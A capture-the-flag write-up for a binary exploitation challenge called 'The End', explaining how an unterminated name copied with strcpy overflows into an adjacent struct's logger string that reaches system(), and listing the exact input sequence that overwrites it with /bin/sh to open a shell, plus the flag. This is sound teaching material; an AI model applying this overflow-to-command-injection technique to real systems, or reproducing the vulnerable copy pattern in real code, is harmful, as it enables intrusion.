## The End

[end](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/the-end/end)  
[end.c](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/the-end/end.c)

> Let's analyze the main() function

```C
int main() {

    ...
    ...

    char command[COMMAND_MAX_LENGTH];
    snprintf(command, COMMAND_MAX_LENGTH, app.stats.logger,
             app.stats.total_count, app.stats.total_bmi / app.stats.total_count);

    system(command);

    exit(0);
}
```

> The line `system(command);` is key because if we could make command to be `/bin/sh`, we can spawn a shell. Hence our aim is to overflow and write into `app.stats.logger` since it is being copied into the command variable during `snprintf()`.

```C
int main() {
    setup();

    show_menu();

    app.list = (struct Person *) malloc(sizeof(struct Person) * 20);

    strcpy(app.stats.logger, "echo \"-- total: %d, average BMI: %.2f --\" >> log.txt"); //vulnerable
    app.stats.total_bmi = 0;
    app.stats.total_count = 0;

    ...
    ...
}
```

> This is the only place in the code that messes with `app.stats.logger` but it is useless since we can't do anything with it.

```C
void add_person() {
    printf("Index (0-19): ");
    int index = read_int();
    if (index < 0 || index > 19) {
        printf("Aha! Doing something bad huh?");
        return;
    }

    printf("Name: ");
    char *name = read_str();
    strncpy((char *) app.list[index].name, name, NAME_MAX_LENGTH);  // Copy name over safely

    ...
    ...  
```

> In the `add_person()` function we do a `strncpy()` with max length of 16, but it has a vulnerability that if it is not null terminated, it will keep doing its thing. But we cannot simply add characters behind it because it takes in maximum 16 only.

```C
void select_person() {
    printf("Index (0-19): ");
    int index = read_int();
    if (index < 0 || index > 19) {
        printf("Aha! Doing something bad huh?");
        return;
    }

    struct Person *p = &app.list[index];

    strcpy(app.selected.name, p->name);
    app.selected.age = p->age;
    app.selected.gender = p->gender;
    app.selected.height = p->height;
    app.selected.weight = p->weight;
}
```

> In the `select_person()` function we see `strcpy()` of the `name` into `app.selected.name`

```C
struct Info {
    char  logger[COMMAND_MAX_LENGTH];
    int   total_count;
    float total_bmi;
};

struct Person {
    char name[NAME_MAX_LENGTH];
    int  age;
    int  gender;
    int  height;
    int  weight;
};

struct App {
    struct Person *list;
    struct Person selected;
    struct Info   stats;
} app;
```
> Then looking at the struct `App`, after `Person selected` is `Info stats` and inside Info stats we have `char logger` which is what we need to overwrite. Because in struct, the contents are on top of one another, so we can add another Person struct and put `/bin/sh` there (the two persons struct must have adjacent indexes)

```
>>>add person index 0
AAAAAAAAAAAAAAAA
keep reading
keep reading
keep reading
keep reading
>>>add person index 1
/bin/sh
terminate string
doesnt matter
doesnt matter
doesnt matter
```
> For this case, u can use -1 for keep reading (FFFF in hex) u cannot use 1 because it is 0001 and since there's a 0 it will be terminated and we don't want that.

> Then when we call `select_person()` in option 3, the name which is `AAAAAAAAAAAAAAAA/bin/sh` will be put into `app.selected.name` where /bin/sh is overflowed into `app.stats.logger`, then we simply need to run option 4 to break out of the loop and reach the part where `system(command)` is called. The entire flow is as follows:

```
1
0
AAAAAAAAAAAAAAAA
-1
-1
-1
-1

1
1
/bin/sh
0
0
0
0

3
0

3
1

4
```

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/the-end/Solved.png)  

`CS2107{tH3_End_7o_ThE_3ND_1s_Th3_Be91nNInG}`
